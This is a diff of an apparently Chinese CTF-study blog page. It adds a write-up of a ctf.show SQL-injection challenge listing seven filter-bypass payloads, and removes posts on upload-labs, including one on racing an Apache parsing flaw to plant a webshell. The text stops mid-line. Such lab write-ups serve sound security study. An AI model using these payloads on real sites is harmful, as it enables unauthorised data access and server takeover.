@@ -102,7 +102,62 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/" data-id="cmawczpo10025ik7k4n6q45wo" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/" data-id="cmaxy8gbx001zkg7k2v0r5ran" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/绕过/绕过" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E7%BB%95%E8%BF%87/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;ctf.show萌新计划web1&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span><span class="comment"># 包含数据库连接文件</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);<span class="comment"># 判断get提交的参数id是否存在</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&#x27;|\&quot;|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\^|\!|\~|x|hex|\(|\)|\+|select/i&quot;</span>,<span class="variable">$id</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;id error&quot;</span>);</span><br><span class="line">    &#125;<span class="comment"># 判断id的值是否大于999</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$id</span>) &gt; <span class="number">999</span>)&#123;<span class="comment"># id 大于 999 直接退出并返回错误</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;id error&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;<span class="comment"># id 小于 999 拼接sql语句</span></span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from article where id = <span class="subst">$id</span> order by id limit 1 &quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;执行的sql为：<span class="subst">$sql</span>&lt;br&gt;&quot;</span>;<span class="comment"># 执行sql 语句</span></span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);<span class="comment"># 判断有没有查询结果</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment"># 如果有结果，获取结果对象的值$row</span></span><br><span class="line">            <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;id: &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;id&quot;</span>]. <span class="string">&quot; - title: &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;title&quot;</span>]. <span class="string">&quot; &lt;br&gt;&lt;hr&gt;&quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;content&quot;</span>]. <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="comment"># 关闭数据库连接</span></span><br><span class="line">        <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;!-- flag in id = <span class="number">1000</span> --&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>查看题目给我们的源码，发现这是用的intval函数，我们看这个禁用的名单，发现还是有很多没有禁用的</p>
+</blockquote>
+<blockquote>
+<p>方法一：?id&#x3D;1 || id&#x3D;1000 那这样sql语句就会变成select * from article where id &#x3D; 1 || id&#x3D;1000 order by id limit 1，以至于满足查询条件，而且查询到1000的信息</p>
+</blockquote>
+<blockquote>
+<p>方法二：~取反符号，双重取反~~1000</p>
+</blockquote>
+<blockquote>
+<p>方法三：二进制转换，<code>id=0b1111101000</code>​</p>
+</blockquote>
+<blockquote>
+<p>方法四：采用单引号，让判断为字符id&#x3D;’1000’</p>
+</blockquote>
+<blockquote>
+<p>方法五：采用异或，0000%5E1000</p>
+</blockquote>
+<blockquote>
+<p>方法六：采用恒定真值，id %23</p>
+</blockquote>
+<blockquote>
+<p>方法七：采用sql中除号的另外一种写法绕过（div）?id&#x3D;500 div 0.5</p>
+</blockquote>
+<p>‍</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E7%BB%95%E8%BF%87/" data-id="cmaxy8gc0002gkg7kg6yp5oeq" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -258,255 +313,7 @@ sqlmap -g &quot;inurl:.php?id=&quot;
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/" data-id="cmawczpo1002bik7kcwhu8mjs" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/绕过/绕过" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E7%BB%95%E8%BF%87/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;ctf.show萌新计划web1&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span><span class="comment"># 包含数据库连接文件</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);<span class="comment"># 判断get提交的参数id是否存在</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&#x27;|\&quot;|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\^|\!|\~|x|hex|\(|\)|\+|select/i&quot;</span>,<span class="variable">$id</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;id error&quot;</span>);</span><br><span class="line">    &#125;<span class="comment"># 判断id的值是否大于999</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$id</span>) &gt; <span class="number">999</span>)&#123;<span class="comment"># id 大于 999 直接退出并返回错误</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;id error&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;<span class="comment"># id 小于 999 拼接sql语句</span></span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from article where id = <span class="subst">$id</span> order by id limit 1 &quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;执行的sql为：<span class="subst">$sql</span>&lt;br&gt;&quot;</span>;<span class="comment"># 执行sql 语句</span></span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);<span class="comment"># 判断有没有查询结果</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment"># 如果有结果，获取结果对象的值$row</span></span><br><span class="line">            <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;id: &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;id&quot;</span>]. <span class="string">&quot; - title: &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;title&quot;</span>]. <span class="string">&quot; &lt;br&gt;&lt;hr&gt;&quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;content&quot;</span>]. <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="comment"># 关闭数据库连接</span></span><br><span class="line">        <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;!-- flag in id = <span class="number">1000</span> --&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>查看题目给我们的源码，发现这是用的intval函数，我们看这个禁用的名单，发现还是有很多没有禁用的</p>
-</blockquote>
-<blockquote>
-<p>方法一：?id&#x3D;1 || id&#x3D;1000 那这样sql语句就会变成select * from article where id &#x3D; 1 || id&#x3D;1000 order by id limit 1，以至于满足查询条件，而且查询到1000的信息</p>
-</blockquote>
-<blockquote>
-<p>方法二：~取反符号，双重取反~~1000</p>
-</blockquote>
-<blockquote>
-<p>方法三：二进制转换，<code>id=0b1111101000</code>​</p>
-</blockquote>
-<blockquote>
-<p>方法四：采用单引号，让判断为字符id&#x3D;’1000’</p>
-</blockquote>
-<blockquote>
-<p>方法五：采用异或，0000%5E1000</p>
-</blockquote>
-<blockquote>
-<p>方法六：采用恒定真值，id %23</p>
-</blockquote>
-<blockquote>
-<p>方法七：采用sql中除号的另外一种写法绕过（div）?id&#x3D;500 div 0.5</p>
-</blockquote>
-<p>‍</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E7%BB%95%E8%BF%87/" data-id="cmawczpo2002eik7kbc6q9n75" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/文件上传/upload-labs/Apache解析漏洞+条件竞争" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E+%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="Apache解析漏洞-条件竞争"><a href="#Apache解析漏洞-条件竞争" class="headerlink" title="Apache解析漏洞+条件竞争"></a>Apache解析漏洞+条件竞争</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;./myupload.php&quot;</span>);</span><br><span class="line">    <span class="variable">$imgFileName</span> =<span class="title function_ invoke__">time</span>();</span><br><span class="line">    <span class="variable">$u</span> = <span class="keyword">new</span> <span class="title class_">MyUpload</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>],<span class="variable">$imgFileName</span>);</span><br><span class="line">    <span class="variable">$status_code</span> = <span class="variable">$u</span>-&gt;<span class="title function_ invoke__">upload</span>(UPLOAD_PATH);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$status_code</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable">$img_path</span> = <span class="variable">$u</span>-&gt;cls_upload_dir . <span class="variable">$u</span>-&gt;cls_file_rename_to;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件已经被上传，但没有重命名。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">1</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传目录不可写。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">3</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，无法上传该类型文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">4</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传的文件过大。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">5</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，服务器已经存在相同名称文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">6</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件无法上传，文件不能复制到目标目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;未知错误！&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//myupload.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyUpload</span></span>&#123;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$cls_arr_ext_accepted</span> = <span class="keyword">array</span>(</span><br><span class="line">      <span class="string">&quot;.doc&quot;</span>, <span class="string">&quot;.xls&quot;</span>, <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;.pdf&quot;</span>, <span class="string">&quot;.gif&quot;</span>, <span class="string">&quot;.jpg&quot;</span>, <span class="string">&quot;.zip&quot;</span>, <span class="string">&quot;.rar&quot;</span>, <span class="string">&quot;.7z&quot;</span>,<span class="string">&quot;.ppt&quot;</span>,</span><br><span class="line">      <span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.xml&quot;</span>, <span class="string">&quot;.tiff&quot;</span>, <span class="string">&quot;.jpeg&quot;</span>, <span class="string">&quot;.png&quot;</span> );</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......  </span><br><span class="line">  <span class="comment">/** upload()</span></span><br><span class="line"><span class="comment">   **</span></span><br><span class="line"><span class="comment">   ** Method to upload the file.</span></span><br><span class="line"><span class="comment">   ** This is the only method to call outside the class.</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@para</span> String name of directory we upload to</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@returns</span> void</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"> <span class="variable">$dir</span> </span>)</span>&#123;</span><br><span class="line">  </span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isUploadedFile</span>();</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setDir</span>( <span class="variable">$dir</span> );</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkExtension</span>();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkSize</span>();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );  </span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// if flag to check if the file exists is set to 1</span></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable language_">$this</span>-&gt;cls_file_exists == <span class="number">1</span> )&#123;</span><br><span class="line">  </span><br><span class="line">      <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkFileExists</span>();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );  </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we are here, we are ready to move the file to destination</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">move</span>();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );  </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if we need to rename the file</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable language_">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">renameFile</span>();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );  </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// if we are here, everything worked as planned :)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="string">&quot;SUCCESS&quot;</span> );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>先检查后缀，再到服务器,不能直接上传php文件了，apache从后往前看，不能去解析那个.7z文件那么就会往前面解析php文件</p>
-<p>我们要在重命名之前,对那个访问小马文件进行访问，就可以留下一句话木马</p>
-<p>在上传抓包生成小马文件后，在末尾加上.7z</p>
-</blockquote>
-<p>‍</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E+%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/" data-id="cmawczpo8002oik7k2lbwakty" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/文件上传/upload-labs/user.ini" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/user.ini/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="user-ini"><a href="#user-ini" class="headerlink" title="user.ini"></a>user.ini</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span 